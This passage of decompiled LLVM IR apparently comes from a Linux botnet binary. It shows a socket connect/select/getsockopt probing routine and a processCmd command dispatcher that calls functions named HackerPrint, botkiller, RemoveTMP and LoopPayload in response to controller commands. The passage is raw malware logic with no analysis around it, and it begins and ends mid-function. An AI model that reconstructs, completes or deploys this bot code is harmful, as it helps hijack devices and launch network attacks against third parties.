  %v3_804fbb3 = inttoptr i32 %v2_804fbb3 to i32*
  store i32 %v2_804fa22, i32* %v3_804fbb3, align 4
  %v0_804fbb7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fbb7 = load i32, i32* @esp, align 4
  %v2_804fbb7 = inttoptr i32 %v1_804fbb7 to i32*
  store i32 %v0_804fbb7, i32* %v2_804fbb7, align 4
  %v3_804fbba = call i32 @__libc_connect(i32 %v7_804fafc, i32 %v12_804f9e6, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804fbba, i32* %eax.global-to-local, align 4
  %v10_804fbbf = icmp eq i32 %v3_804fbba, -1
  %v1_804fbc2 = icmp eq i1 %v10_804fbbf, false
  br i1 %v1_804fbc2, label %dec_label_pc_804fbd0, label %dec_label_pc_804fbc4

dec_label_pc_804fbc4:                             ; preds = %dec_label_pc_804fb32
  %v1_804fbc4 = call i32 @__errno_location(i32 %v7_804fafc)
  store i32 %v1_804fbc4, i32* %eax.global-to-local, align 4
  %v1_804fbc9 = inttoptr i32 %v1_804fbc4 to i32*
  %v2_804fbc9 = load i32, i32* %v1_804fbc9, align 4
  store i32 %v2_804fbc9, i32* %eax.global-to-local, align 4
  %v9_804fbcb = icmp eq i32 %v2_804fbc9, 115
  br i1 %v9_804fbcb, label %dec_label_pc_804fbe6, label %dec_label_pc_804fbd0

dec_label_pc_804fbd0:                             ; preds = %dec_label_pc_804fbc4, %dec_label_pc_804fb32
  store i32 %storemerge42, i32* %eax.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %edx.global-to-local, align 4
  %v5_804fbd6 = load i32, i32* %v4_804fb5f, align 8
  store i32 %v5_804fbd6, i32* %eax.global-to-local, align 4
  %v1_804fbd9 = load i32, i32* @esp, align 4
  %v2_804fbd9 = inttoptr i32 %v1_804fbd9 to i32*
  store i32 %v5_804fbd6, i32* %v2_804fbd9, align 4
  %v1_804fbdc = call i32 @__libc_close(i32 %v7_804fafc)
  store i32 %v1_804fbdc, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fdd7

dec_label_pc_804fbe6:                             ; preds = %dec_label_pc_804fbc4
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v5_804fafc, align 4
  br label %dec_label_pc_804fdd7

dec_label_pc_804fbf6:                             ; preds = %dec_label_pc_804faf6
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804fc00, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804fc07 = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v3_804fc15 = add i32 %v2_804fafc, %v2_804fa7a
  %v4_804fc15 = inttoptr i32 %v3_804fc15 to i32*
  %v5_804fc15 = load i32, i32* %v4_804fc15, align 8
  %v2_804fc1a = udiv i32 %v5_804fc15, 32
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v5_804fc23 = load i32, i32* %v4_804fc15, align 8
  %v1_804fc26 = urem i32 %v5_804fc23, 32
  store i32 %v1_804fc26, i32* %eax.global-to-local, align 4
  %v0_804fc29 = load i32, i32* @ebp, align 4
  %v2_804fc29 = mul nuw nsw i32 %v2_804fc1a, 4
  %v3_804fc29 = add nsw i32 %v2_804fc29, -192
  %v4_804fc29 = add i32 %v3_804fc29, %v0_804fc29
  %v5_804fc29 = inttoptr i32 %v4_804fc29 to i32*
  %v6_804fc29 = load i32, i32* %v5_804fc29, align 4
  %v9_804fc29 = shl i32 1, %v1_804fc26
  %v12_804fc29 = or i32 %v6_804fc29, %v9_804fc29
  store i32 %v12_804fc29, i32* %v5_804fc29, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v5_804fc4b = load i32, i32* %v4_804fc15, align 8
  %v1_804fc4e = add i32 %v5_804fc4b, 1
  store i32 %v1_804fc4e, i32* %edx.global-to-local, align 4
  %v1_804fc57 = load i32, i32* @esp, align 4
  %v2_804fc57 = add i32 %v1_804fc57, 16
  %v3_804fc57 = inttoptr i32 %v2_804fc57 to i32*
  store i32 %v2_804fc51, i32* %v3_804fc57, align 4
  %v0_804fc5b = load i32, i32* @esp, align 4
  %v1_804fc5b = add i32 %v0_804fc5b, 12
  %v2_804fc5b = inttoptr i32 %v1_804fc5b to i32*
  store i32 0, i32* %v2_804fc5b, align 4
  store i32 %v2_804fc00, i32* %eax.global-to-local, align 4
  %v1_804fc69 = load i32, i32* @esp, align 4
  %v2_804fc69 = add i32 %v1_804fc69, 8
  %v3_804fc69 = inttoptr i32 %v2_804fc69 to i32*
  store i32 %v2_804fc00, i32* %v3_804fc69, align 4
  %v0_804fc6d = load i32, i32* @esp, align 4
  %v1_804fc6d = add i32 %v0_804fc6d, 4
  %v2_804fc6d = inttoptr i32 %v1_804fc6d to i32*
  store i32 0, i32* %v2_804fc6d, align 4
  %v0_804fc75 = load i32, i32* %edx.global-to-local, align 4
  %v1_804fc75 = load i32, i32* @esp, align 4
  %v2_804fc75 = inttoptr i32 %v1_804fc75 to i32*
  store i32 %v0_804fc75, i32* %v2_804fc75, align 4
  %v0_804fc78 = load i32, i32* %stack_var_-204, align 4
  %v2_804fc78 = load i32, i32* %stack_var_-196, align 4
  %v5_804fc78 = call i32 @__libc_select(i32 %v0_804fc78, i32 10000, i32 %v2_804fc78, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804fc78, i32* %eax.global-to-local, align 4
  %v12_804fc80 = icmp eq i32 %v5_804fc78, 1
  %v1_804fc84 = icmp eq i1 %v12_804fc80, false
  br i1 %v1_804fc84, label %dec_label_pc_804fd00, label %dec_label_pc_804fc86

dec_label_pc_804fc86:                             ; preds = %dec_label_pc_804fbf6
  store i32 4, i32* %stack_var_-208, align 4
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v5_804fc96 = load i32, i32* %v4_804fc15, align 8
  store i32 %v5_804fc96, i32* %edx.global-to-local, align 4
  %v1_804fc9f = load i32, i32* @esp, align 4
  %v2_804fc9f = add i32 %v1_804fc9f, 16
  %v3_804fc9f = inttoptr i32 %v2_804fc9f to i32*
  store i32 %v2_804fc99, i32* %v3_804fc9f, align 4
  store i32 %v2_804fca3, i32* %eax.global-to-local, align 4
  %v1_804fca9 = load i32, i32* @esp, align 4
  %v2_804fca9 = add i32 %v1_804fca9, 12
  %v3_804fca9 = inttoptr i32 %v2_804fca9 to i32*
  store i32 %v2_804fca3, i32* %v3_804fca9, align 4
  %v0_804fcad = load i32, i32* @esp, align 4
  %v1_804fcad = add i32 %v0_804fcad, 8
  %v2_804fcad = inttoptr i32 %v1_804fcad to i32*
  store i32 4, i32* %v2_804fcad, align 4
  %v0_804fcb5 = load i32, i32* @esp, align 4
  %v1_804fcb5 = add i32 %v0_804fcb5, 4
  %v2_804fcb5 = inttoptr i32 %v1_804fcb5 to i32*
  store i32 1, i32* %v2_804fcb5, align 4
  %v0_804fcbd = load i32, i32* %edx.global-to-local, align 4
  %v1_804fcbd = load i32, i32* @esp, align 4
  %v2_804fcbd = inttoptr i32 %v1_804fcbd to i32*
  store i32 %v0_804fcbd, i32* %v2_804fcbd, align 4
  %v0_804fcc0 = load i32, i32* %stack_var_-208, align 4
  %v1_804fcc0 = load i32, i32* %stack_var_-204, align 4
  %v3_804fcc0 = load i32, i32* %stack_var_-196, align 4
  %v5_804fcc0 = call i32 @getsockopt(i32 %v0_804fcc0, i32 %v1_804fcc0, i32 10000, i32 %v3_804fcc0, i32 ptrtoint (i32* @0 to i32))
  %v3_804fcc5 = load i32, i32* %stack_var_-212, align 4
  %v1_804fccb = icmp eq i32 %v3_804fcc5, 0
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  br i1 %v1_804fccb, label %dec_label_pc_804fcf0, label %dec_label_pc_804fccf

dec_label_pc_804fccf:                             ; preds = %dec_label_pc_804fc86
  %v5_804fcd5 = load i32, i32* %v4_804fc15, align 8
  store i32 %v5_804fcd5, i32* %eax.global-to-local, align 4
  %v1_804fcd8 = load i32, i32* @esp, align 4
  %v2_804fcd8 = inttoptr i32 %v1_804fcd8 to i32*
  store i32 %v5_804fcd5, i32* %v2_804fcd8, align 4
  %v0_804fcdb = load i32, i32* %stack_var_-208, align 4
  %v1_804fcdb = call i32 @__libc_close(i32 %v0_804fcdb)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804fafc, align 4
  br label %dec_label_pc_804fdd7

dec_label_pc_804fcf0:                             ; preds = %dec_label_pc_804fc86
  store i8 2, i8* %v5_804fafc, align 4
  br label %dec_label_pc_804fdd7

dec_label_pc_804fd00:                             ; preds = %dec_label_pc_804fbf6
  %v13_804fd00 = icmp eq i32 %v5_804fc78, -1
  %v1_804fd04 = icmp eq i1 %v13_804fd00, false
  br i1 %v1_804fd04, label %dec_label_pc_804fdd7, label %dec_label_pc_804fd0a

dec_label_pc_804fd0a:                             ; preds = %dec_label_pc_804fd00
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v5_804fd10 = load i32, i32* %v4_804fc15, align 8
  store i32 %v5_804fd10, i32* %eax.global-to-local, align 4
  %v1_804fd13 = load i32, i32* @esp, align 4
  %v2_804fd13 = inttoptr i32 %v1_804fd13 to i32*
  store i32 %v5_804fd10, i32* %v2_804fd13, align 4
  %v1_804fd16 = call i32 @__libc_close(i32 %v5_804fc78)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804fafc, align 4
  br label %dec_label_pc_804fdd7

dec_label_pc_804fd2b:                             ; preds = %dec_label_pc_804fb17
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804fc00, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804fd3c = call i8* @_memset(i8* %tmp33, i32 0, i32 32)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v3_804fd4a = add i32 %v2_804fafc, %v2_804fa7a
  %v4_804fd4a = inttoptr i32 %v3_804fd4a to i32*
  %v5_804fd4a = load i32, i32* %v4_804fd4a, align 8
  %v2_804fd4f = udiv i32 %v5_804fd4a, 32
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v5_804fd58 = load i32, i32* %v4_804fd4a, align 8
  %v1_804fd5b = urem i32 %v5_804fd58, 32
  store i32 %v1_804fd5b, i32* %eax.global-to-local, align 4
  %v0_804fd5e = load i32, i32* @ebp, align 4
  %v2_804fd5e = mul nuw nsw i32 %v2_804fd4f, 4
  %v3_804fd5e = add nsw i32 %v2_804fd5e, -192
  %v4_804fd5e = add i32 %v3_804fd5e, %v0_804fd5e
  %v5_804fd5e = inttoptr i32 %v4_804fd5e to i32*
  %v6_804fd5e = load i32, i32* %v5_804fd5e, align 4
  %v9_804fd5e = shl i32 1, %v1_804fd5b
  %v12_804fd5e = or i32 %v6_804fd5e, %v9_804fd5e
  store i32 %v12_804fd5e, i32* %v5_804fd5e, align 4
  store i32 0, i32* %stack_var_-204, align 4
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v5_804fd80 = load i32, i32* %v4_804fd4a, align 8
  %v1_804fd83 = add i32 %v5_804fd80, 1
  store i32 %v1_804fd83, i32* %edx.global-to-local, align 4
  %v1_804fd8c = load i32, i32* @esp, align 4
  %v2_804fd8c = add i32 %v1_804fd8c, 16
  %v3_804fd8c = inttoptr i32 %v2_804fd8c to i32*
  store i32 %v2_804fc51, i32* %v3_804fd8c, align 4
  store i32 %v2_804fc00, i32* %eax.global-to-local, align 4
  %v1_804fd96 = load i32, i32* @esp, align 4
  %v2_804fd96 = add i32 %v1_804fd96, 12
  %v3_804fd96 = inttoptr i32 %v2_804fd96 to i32*
  store i32 %v2_804fc00, i32* %v3_804fd96, align 4
  %v0_804fd9a = load i32, i32* @esp, align 4
  %v1_804fd9a = add i32 %v0_804fd9a, 8
  %v2_804fd9a = inttoptr i32 %v1_804fd9a to i32*
  store i32 0, i32* %v2_804fd9a, align 4
  %v0_804fda2 = load i32, i32* @esp, align 4
  %v1_804fda2 = add i32 %v0_804fda2, 4
  %v2_804fda2 = inttoptr i32 %v1_804fda2 to i32*
  store i32 0, i32* %v2_804fda2, align 4
  %v0_804fdaa = load i32, i32* %edx.global-to-local, align 4
  %v1_804fdaa = load i32, i32* @esp, align 4
  %v2_804fdaa = inttoptr i32 %v1_804fdaa to i32*
  store i32 %v0_804fdaa, i32* %v2_804fdaa, align 4
  %v0_804fdad = load i32, i32* %stack_var_-204, align 4
  %v2_804fdad = load i32, i32* %stack_var_-196, align 4
  %v5_804fdad = call i32 @__libc_select(i32 %v0_804fdad, i32 10000, i32 %v2_804fdad, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804fdad, i32* %eax.global-to-local, align 4
  %v4_804fdb5 = icmp eq i32 %v5_804fdad, 0
  br i1 %v4_804fdb5, label %dec_label_pc_804fdd7, label %dec_label_pc_804fdbb

dec_label_pc_804fdbb:                             ; preds = %dec_label_pc_804fd2b
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  %v5_804fdc1 = load i32, i32* %v4_804fd4a, align 8
  store i32 %v5_804fdc1, i32* %eax.global-to-local, align 4
  %v1_804fdc4 = load i32, i32* @esp, align 4
  %v2_804fdc4 = inttoptr i32 %v1_804fdc4 to i32*
  store i32 %v5_804fdc1, i32* %v2_804fdc4, align 4
  %v1_804fdc7 = call i32 @__libc_close(i32 %v5_804fdad)
  store i32 %storemerge42, i32* %edx.global-to-local, align 4
  store i32 %v2_804fa7a, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_804fafc, align 4
  br label %dec_label_pc_804fdd7

dec_label_pc_804fdd7:                             ; preds = %dec_label_pc_804fb24, %dec_label_pc_804fd2b, %dec_label_pc_804fd00, %dec_label_pc_804fd0a, %dec_label_pc_804fcf0, %dec_label_pc_804fccf, %dec_label_pc_804fbe6, %dec_label_pc_804fbd0, %dec_label_pc_804fdbb
  %v4_804fdd7 = add nuw nsw i32 %storemerge42, 1
  store i32 %v4_804fdd7, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804fdd7, %v2_804fa02
  br i1 %exitcond, label %dec_label_pc_804fde6, label %dec_label_pc_804faf6

dec_label_pc_804fde6:                             ; preds = %dec_label_pc_804fdda.preheader, %dec_label_pc_804fdd7, %dec_label_pc_804fa40
  %stack_var_-44.0 = phi i32 [ %tmp8, %dec_label_pc_804fa40 ], [ 0, %dec_label_pc_804fdda.preheader ], [ %v2_804fa02, %dec_label_pc_804fdd7 ]
  %v0_804fde6 = load i32, i32* @esp, align 4
  %v1_804fde6 = inttoptr i32 %v0_804fde6 to i32*
  store i32 0, i32* %v1_804fde6, align 4
  %v1_804fded = inttoptr i32 %stack_var_-44.0 to i32*
  %v2_804fded = call i32 @__GI_time(i32* %v1_804fded)
  store i32 %v2_804fded, i32* %eax.global-to-local, align 4
  %v5_804fdf5 = icmp slt i32 %v2_804fded, %v5_804fadf
  br i1 %v5_804fdf5, label %dec_label_pc_804fdda.preheader, label %dec_label_pc_804fdfb

dec_label_pc_804fdda.preheader:                   ; preds = %dec_label_pc_804fde6
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v16_804fddd40, label %dec_label_pc_804faf6, label %dec_label_pc_804fde6

dec_label_pc_804fdfb:                             ; preds = %dec_label_pc_804fde6, %entry
  %v0_804fe07 = phi i32 [ %v3_804fa32, %entry ], [ %v2_804fded, %dec_label_pc_804fde6 ]
  %v2_804fe04 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fe04, i32* @ebx, align 4
  store i32 %v0_804f9e4, i32* @edi, align 4
  ret i32 %v0_804fe07

; uselistorder directives
  uselistorder i32 %v4_804fdd7, { 1, 2, 0 }
  uselistorder i32 %v1_804fd5b, { 1, 0 }
  uselistorder i32 %v5_804fc78, { 2, 0, 1, 3 }
  uselistorder i32 %v1_804fc26, { 1, 0 }
  uselistorder i32* %v4_804fc15, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v7_804fafc, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i8* %v5_804fafc, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %storemerge42, { 5, 15, 14, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 21, 20, 19, 18, 17, 16, 0, 1 }
  uselistorder i32 %v2_804fc00, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_804fa97, { 1, 0 }
  uselistorder i32 %v2_804fa7a, { 20, 19, 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 25, 24, 23, 22, 2, 21, 3, 7, 26, 6, 4, 5 }
  uselistorder i32 %v1_804fa10, { 1, 0 }
  uselistorder i32 %v2_804fa02, { 3, 2, 0, 1 }
  uselistorder i32 %v1_804f9f4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-196, { 1, 3, 2, 0, 4 }
  uselistorder i32* %stack_var_-204, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i32* %eax.global-to-local, { 53, 1, 44, 0, 2, 3, 7, 4, 5, 6, 8, 9, 11, 10, 12, 13, 15, 16, 14, 17, 18, 22, 19, 20, 21, 23, 24, 26, 25, 29, 27, 28, 30, 31, 35, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 45, 47, 46, 48, 50, 49, 51, 52 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 7, 6, 5, 8, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fdd7, { 8, 1, 3, 2, 4, 5, 6, 7, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp217 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804fe0b = load i32, i32* @edi, align 4
  %v0_804fe0c = load i32, i32* @esi, align 4
  %v0_804fe0d = load i32, i32* @ebx, align 4
  store i32 %v0_804fe0d, i32* %stack_var_-16, align 4
  %v5_804fe0e = icmp ult i32* %stack_var_-16, inttoptr (i32 460 to i32*)
  store i1 %v5_804fe0e, i1* %cf.global-to-local, align 1
  %v2_804fe17 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fe34 = inttoptr i32 %v2_804fe17 to i8*
  store i32 %v2_804fe17, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_80590d7.21 to i32), i32* @edi, align 4
  %v7_804fe46 = call i32 @_strncmp(i8* %v4_804fe34, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80590d7.21, i32 0, i32 0), i32 5)
  %v8_804fe46 = urem i32 %v7_804fe46, 2
  %v9_804fe46 = icmp eq i32 %v8_804fe46, 0
  %v0_804fe48 = load i1, i1* %cf.global-to-local, align 1
  %v2_804fe48 = or i1 %v0_804fe48, %v9_804fe46
  %v3_804fe48 = zext i1 %v2_804fe48 to i32
  %v4_804fe48 = load i32, i32* @edx, align 4
  %v5_804fe48 = and i32 %v4_804fe48, -256
  %v6_804fe48 = or i32 %v3_804fe48, %v5_804fe48
  %v7_804fe48 = xor i32 %v6_804fe48, 1
  store i32 %v7_804fe48, i32* %edx.global-to-local, align 4
  %v1_804fe50 = trunc i32 %v7_804fe48 to i8
  %v3_804fe50 = zext i1 %v0_804fe48 to i8
  %v15_804fe50 = icmp eq i8 %v1_804fe50, %v3_804fe50
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fe59 = icmp eq i1 %v15_804fe50, false
  br i1 %v1_804fe59, label %dec_label_pc_804fe75, label %dec_label_pc_804fe5b

dec_label_pc_804fe5b:                             ; preds = %entry
  %v0_804fe5b = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804fe5b = ptrtoint i8* %v0_804fe5b to i32
  %v3_804fe6b = call i32 @HackerPrint(i32 %v1_804fe5b, i32 ptrtoint ([6 x i8]* @global_var_805b939.429 to i32))
  br label %dec_label_pc_8051255

dec_label_pc_804fe75:                             ; preds = %entry
  %v2_804fe78 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fe95 = inttoptr i32 %v2_804fe78 to i8*
  store i32 %v2_804fe78, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805b93f.430 to i32), i32* @edi, align 4
  %v7_804fea7 = call i32 @_strncmp(i8* %v4_804fe95, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_805b93f.430, i32 0, i32 0), i32 11)
  %v8_804fea7 = urem i32 %v7_804fea7, 2
  %v9_804fea7 = icmp eq i32 %v8_804fea7, 0
  %v0_804fea9 = load i1, i1* %cf.global-to-local, align 1
  %v2_804fea9 = or i1 %v0_804fea9, %v9_804fea7
  %v3_804fea9 = zext i1 %v2_804fea9 to i32
  %v4_804fea9 = load i32, i32* %edx.global-to-local, align 4
  %v5_804fea9 = and i32 %v4_804fea9, -256
  %v6_804fea9 = or i32 %v3_804fea9, %v5_804fea9
  %v7_804fea9 = xor i32 %v6_804fea9, 1
  store i32 %v7_804fea9, i32* %edx.global-to-local, align 4
  %v1_804feb1 = trunc i32 %v7_804fea9 to i8
  %v3_804feb1 = zext i1 %v0_804fea9 to i8
  %v15_804feb1 = icmp eq i8 %v1_804feb1, %v3_804feb1
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804feba = icmp eq i1 %v15_804feb1, false
  br i1 %v1_804feba, label %dec_label_pc_804fee8, label %dec_label_pc_804febc

dec_label_pc_804febc:                             ; preds = %dec_label_pc_804fe75
  %v0_804febc = load i32, i32* @global_var_8064708.231, align 8
  %v2_804fec4 = call i32 @__GI_inet_ntoa(i32 %v0_804febc)
  %v0_804fec9 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804fec9 = ptrtoint i8* %v0_804fec9 to i32
  store i32 %v1_804fec9, i32* %edx.global-to-local, align 4
  %v3_804fede = call i32 @HackerPrint(i32 %v1_804fec9, i32 ptrtoint ([10 x i8]* @global_var_805b94a.431 to i32))
  br label %dec_label_pc_8051255

dec_label_pc_804fee8:                             ; preds = %dec_label_pc_804fe75
  %v2_804feeb = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804ff08 = inttoptr i32 %v2_804feeb to i8*
  store i32 %v2_804feeb, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805b954.432 to i32), i32* @edi, align 4
  %v7_804ff1a = call i32 @_strncmp(i8* %v4_804ff08, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805b954.432, i32 0, i32 0), i32 8)
  %v8_804ff1a = urem i32 %v7_804ff1a, 2
  %v9_804ff1a = icmp eq i32 %v8_804ff1a, 0
  %v0_804ff1c = load i1, i1* %cf.global-to-local, align 1
  %v2_804ff1c = or i1 %v0_804ff1c, %v9_804ff1a
  %v3_804ff1c = zext i1 %v2_804ff1c to i32
  %v4_804ff1c = load i32, i32* %edx.global-to-local, align 4
  %v5_804ff1c = and i32 %v4_804ff1c, -256
  %v6_804ff1c = or i32 %v3_804ff1c, %v5_804ff1c
  %v7_804ff1c = xor i32 %v6_804ff1c, 1
  store i32 %v7_804ff1c, i32* @edx, align 4
  %v1_804ff24 = trunc i32 %v7_804ff1c to i8
  %v3_804ff24 = zext i1 %v0_804ff1c to i8
  %v15_804ff24 = icmp eq i8 %v1_804ff24, %v3_804ff24
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ff2d = icmp eq i1 %v15_804ff24, false
  br i1 %v1_804ff2d, label %dec_label_pc_804ff63, label %dec_label_pc_804ff2f

dec_label_pc_804ff2f:                             ; preds = %dec_label_pc_804fee8
  %v0_804ff2f = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ff34 = icmp eq i32 %v0_804ff2f, 0
  %v1_804ff36 = icmp eq i1 %v1_804ff34, false
  br i1 %v1_804ff36, label %dec_label_pc_804ff63, label %dec_label_pc_804ff38

dec_label_pc_804ff38:                             ; preds = %dec_label_pc_804ff2f
  %v0_804ff38 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804ff38 = ptrtoint i8* %v0_804ff38 to i32
  %v3_804ff48 = call i32 @HackerPrint(i32 %v1_804ff38, i32 ptrtoint ([13 x i8]* @global_var_805b95c.433 to i32))
  %v0_804ff4d = call i32 @botkiller()
  %v0_804ff52 = call i32 @RemoveTMP()
  %v2_804ff5e = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ff63:                             ; preds = %dec_label_pc_804ff2f, %dec_label_pc_804fee8
  %v2_804ff66 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804ff83 = inttoptr i32 %v2_804ff66 to i8*
  store i32 %v2_804ff66, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805b969.434 to i32), i32* @edi, align 4
  %v7_804ff95 = call i32 @_strncmp(i8* %v4_804ff83, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b969.434, i32 0, i32 0), i32 7)
  %v8_804ff95 = urem i32 %v7_804ff95, 2
  %v9_804ff95 = icmp eq i32 %v8_804ff95, 0
  %v0_804ff97 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ff97 = or i1 %v0_804ff97, %v9_804ff95
  %v3_804ff97 = zext i1 %v2_804ff97 to i32
  %v4_804ff97 = load i32, i32* @edx, align 4
  %v5_804ff97 = and i32 %v4_804ff97, -256
  %v6_804ff97 = or i32 %v3_804ff97, %v5_804ff97
  %v7_804ff97 = xor i32 %v6_804ff97, 1
  store i32 %v7_804ff97, i32* @edx, align 4
  %v1_804ff9f = trunc i32 %v7_804ff97 to i8
  %v3_804ff9f = zext i1 %v0_804ff97 to i8
  %v15_804ff9f = icmp eq i8 %v1_804ff9f, %v3_804ff9f
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ffa8 = icmp eq i1 %v15_804ff9f, false
  br i1 %v1_804ffa8, label %dec_label_pc_804ffd9, label %dec_label_pc_804ffaa

dec_label_pc_804ffaa:                             ; preds = %dec_label_pc_804ff63
  %v0_804ffaa = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ffaf = icmp eq i32 %v0_804ffaa, 0
  %v1_804ffb1 = icmp eq i1 %v1_804ffaf, false
  br i1 %v1_804ffb1, label %dec_label_pc_804ffd9, label %dec_label_pc_804ffb3

dec_label_pc_804ffb3:                             ; preds = %dec_label_pc_804ffaa
  %v0_804ffb3 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_804ffb3 = ptrtoint i8* %v0_804ffb3 to i32
  %v3_804ffc3 = call i32 @HackerPrint(i32 %v1_804ffb3, i32 ptrtoint ([16 x i8]* @global_var_805b970.435 to i32))
  %v0_804ffc8 = call i32 @LoopPayload()
  %v2_804ffd4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ffd9:                             ; preds = %dec_label_pc_804ffaa, %dec_label_pc_804ff63
  %v2_804ffdc = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fff9 = inttoptr i32 %v2_804ffdc to i8*
  store i32 %v2_804ffdc, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805b980.436 to i32), i32* @edi, align 4
  %v7_805000b = call i32 @_strncmp(i8* %v4_804fff9, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805b980.436, i32 0, i32 0), i32 7)
  %v8_805000b = urem i32 %v7_805000b, 2
  %v9_805000b = icmp eq i32 %v8_805000b, 0
  %v0_805000d = load i1, i1* %cf.global-to-local, align 1
  %v2_805000d = or i1 %v0_805000d, %v9_805000b
  %v3_805000d = zext i1 %v2_805000d to i32
  %v4_805000d = load i32, i32* @edx, align 4
  %v5_805000d = and i32 %v4_805000d, -256
  %v6_805000d = or i32 %v3_805000d, %v5_805000d
  %v7_805000d = xor i32 %v6_805000d, 1
  store i32 %v7_805000d, i32* %edx.global-to-local, align 4
  %v1_8050015 = trunc i32 %v7_805000d to i8
  %v3_8050015 = zext i1 %v0_805000d to i8
  %v15_8050015 = icmp eq i8 %v1_8050015, %v3_8050015
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805001e = icmp eq i1 %v15_8050015, false
  br i1 %v1_805001e, label %dec_label_pc_8050168, label %dec_label_pc_8050024

